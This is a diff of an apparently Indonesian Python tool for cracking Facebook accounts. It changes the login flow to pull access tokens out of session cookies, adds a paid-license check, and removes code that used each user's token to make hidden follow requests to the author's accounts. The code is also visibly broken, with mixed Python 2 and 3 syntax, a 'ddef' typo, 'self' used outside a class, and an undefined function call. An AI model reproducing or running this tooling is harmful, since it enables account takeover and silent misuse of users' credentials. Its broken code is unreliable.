@@ -10,42 +10,182 @@ ok,cp,cot=0,0,0
 ajg=""
 mb="https://mbasic.facebook.com"
 
-def login():
+ddef pilihlogin():
 	os.system("clear")
-	print("""
-	 HARAP LOGIN UNTUK MELANJUTKAN KE SCRIPT
-	""")
-	print("[1]. Login Dengan Accesstoken Facebook\n[2]. Cara Mendapatkan Accesstoken\n")
-	pil=input("[!] Pilih Metode Login: ")
-	if(pil in ("01","1")):
-		to=input("[+] Masukan Access Token Anda: ")
-		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
+	try:
+		token = open('login.txt','r')
+		menu()
+	except (KeyError,IOError):
+		logo()
+		print
+		print("\033[1;96m[\033[1;97m01\033[1;96m] \033[1;97mLogin via TOKEN")
+		print("\033[1;96m[\033[1;97m02\033[1;96m] \033[1;97mLogin via COOKIE")
+		bct = raw_input("\n[?] pilih : ")
+		if bct == "":
+			pilihlogin()
+		elif bct == "1":
+			tokenz()
+		elif bct == "2":
+			gen()
+
+def gen():
+	os.system('clear')
+	logo()
+	print
+	cookie = raw_input(" \033[1;97m[\033[1;96m+[\033[1;97m] \033[1;96mMasukan Cookies \033[1;97m: ")
+	try:
+		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
+		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
+		'referer'                   : 'https://m.facebook.com/',
+		'host'                      : 'm.facebook.com',
+		'origin'                    : 'https://m.facebook.com',
+		'upgrade-insecure-requests' : '1',
+		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+		'cache-control'             : 'max-age=0',
+		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		'content-type'              : 'text/html; charset=utf-8'
+		}, cookies = {
+		'cookie'                    : cookie
+		})
+		find_token = re.search('(EAAA\w+)', data.text)
+		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
+	except requests.exceptions.ConnectionError:
+		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
+	cookie = open("login.txt", 'w')
+	cookie.write(find_token.group(1))
+	cookie.close()
+	menu()
+                            
+def tokenz():
+	os.system('clear')
+	try:
+		token = open('login.txt', 'r')
+		menu()
+	except (KeyError, IOError):
+		os.system('clear')
+		print
+		logo()
+		token = raw_input('\n\033[1;97m [\033[1;96m+\033[1;97m] \033[1;96mMasukkan Token \033[1;97m: ')
 		try:
-			nama=r['name']
-			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={to}')
-			req.post(f'https://graph.facebook.com/100004018035398/subscribers?access_token={to}')
-			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={to}')
-			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={to}")
-			req.post(f"https://graph.facebook.com/100069718286138/subscribers?access_token={to}")
-			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={to}")
-			print(f"[☆] Login Berhasil [☆]\nWelcome {nama}")
-			open("save","a").write(to)
-			time.sleep(0.01)
-			crack(to,nama).menu()
+			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
+			a = json.loads(otw.text)
+			zedd = open('login.txt', 'w')
+			zedd.write(token)
+			zedd.close()
+			menu()
 		except KeyError:
-			print("[×] Login Gagal [×]\nAccess Token Salah")
-			time.sleep(0.01)
-			login()
-	elif(pil in ("2","02")):
-		os.system("xdg-open https://youtu.be/guj9s2aK3vM")
-	elif(pil in (" ","  ","   ","    ","     ")):
-		print("[!] Jangan Kosong")
+			print("[!] Token Invalid!")
+			sys.exit()
+
+def xxnx():
+    try:
+        toket = open('licensed.log', 'r').read()
+    except IOError:
+        print '\x1b[1;91m License Invalid !'
+        os.system('clear')
+        os.system('rm -rf licensed.log')
+        lisen()
+
+    if os.path.exists('licensed.log'):
+        user1()
+    else:
+        lisen()
+	
+def tik():
+    titik = [
+     '.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Memeriksa Lisensi ' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+        
+def lisen():
+    os.system('clear')
+    logo()
+    jalan('\n\x1b[1;97m [*] Mohon tunggu ...');time.sleep(1.0)
+    id = uuid.uuid4().hex[:25]
+    idg = open('licensed.log', 'w')
+    idg.write(id)
+    idg.close()
+    jalan ('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi : \x1b[96m' + id)
+    time.sleep(0.07)
+    jalan ('\x1b[1;91m [*] Lisensi Belum Di konfirmasi\x1b[1;39m')
+    time.sleep(0.07)
+    jalan ('\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mChat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
+    time.sleep(0.07)
+    raw_input('\n\x1b[1;97m [*] Tekan Enter ')
+    os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + id + ' >/dev/null') 
+    time.sleep(1)
+    os.sys.exit()
+    
+def user1():
+    try:
+        j = open('licensed.log', 'r').read()
+        r = requests.get('https://github.com/bucin25/License/blob/main/id').text.strip() # Jangan Di ganti bro'i nanti error
+        if j in r:
+            os.system('clear')
+            logo()
+            tik()
+            jalan('\n\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Lisensi \033[1;92mTersedia ✓')
+            time.sleep(1)
+            pilihlogin()
+        else:
+            os.system('clear')
+            logo()
+            tik()
+            jalan ('\n\x1b[1;91m [*] Lisensi Tidak Tersedia !')
+            time.sleep(1)
+            lisen()
+            jalan ('\033[1;96m [\033[1;97m*\033[1;96m]\033[1;97m Chat Admin Untuk Mengkonfirmasi Lisensi\x1b[1;39m')
+            time.sleep(0.07)
+            raw_input('\n\x1b[1;97m [*] Tekan Enter ')
+            os.system('am start https://wa.me/+62895341157823?text=Hi+Ratu+Beli+Lisensi+dong.%20Lisensi:%20' + j + ' >/dev/null')
+            os.sys.exit()
+    except requests.exceptions.ConnectionError:
+    	os.system('clear')
+        print '\x1b[1;91m [!] Tidak Ada Koneksi Data\x1b[0;97m'
+        os.sys.exit()
+    except KeyboardInterrupt:
+        os.sys.exit()
+    except IOError:
+        subprocess.Popen(['rm', '-rf', 'licensed.log'])
+        romz()
+        
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
 		time.sleep(0.01)
-		login()
-	else:
-		print("[!] Pilihan Tidak Ada")
-		time.sleep(1)
-		login()
+		
+def logo():
+	time.sleep (0.01)
+	print('')
+	print('')
+	time.sleep(0.01)
+	self.jalan("\033[1;37m                    ______---_____ ")
+	self.jalan("\033[1;37m         ___-----           __      ---- ")
+	self.jalan("\033[1;37m ___---             ___------             \ ")
+	self.jalan("\033[1;37m     ---______        ----                 \ ")
+	self.jalan("\033[1;37m                 --__    |             _____)")
+	self.jalan("\033[1;37m                     -                /     \ ")
+	self.jalan("\033[1;37m          _____-----    ___--         \    / )")
+	self.jalan("\033[1;37m    -----_____      ---____            \__/  /")
+	self.jalan("\033[1;37m                 --__    \ --    _          /\ ")
+	self.jalan("\033[1;37m                      --__-__     \_____/   \_/\ ")
+	self.jalan("\033[1;37m                            ----|   /          |")
+	self.jalan("\033[1;36mAuthor \033[1;37m : JESSICA PUTRY         |  |___________|")
+	self.jalan("\033[1;36mGelar  \033[1;37m : RATU ERROR            |  | ((_(_)| )_)")
+	self.jalan("\033[1;36mJabatan\033[1;37m : \33[3;1m\033[1;37mOwner group \033[1;33mR.E...... \33[0;1m\033[1;37m|  \_((_(_)|/(_)")
+	self.jalan("\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\             (")
+	self.jalan("\033[1;36m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\033[1;37m\_____________)")
+	print('')
+	print('')
+	time.sleep(0.03)
+     
+HUT = '\x1b[1;34m'
+H = '\x1b[1;37m'
+	
+	
 def logika():
 	try:
 		token=open("save","r").read()
@@ -335,6 +475,9 @@ class crack:
 			print("\n[√] Menuju WhatsApp Author....\n[!] Klik Buka Dengan WhatsApp")
 			os.system("xdg-open https://wa.me/62895341157823")
 
+			
+			
+			
 if __name__=="__main__":
 	try:
 		ua=open("ua","r").read()
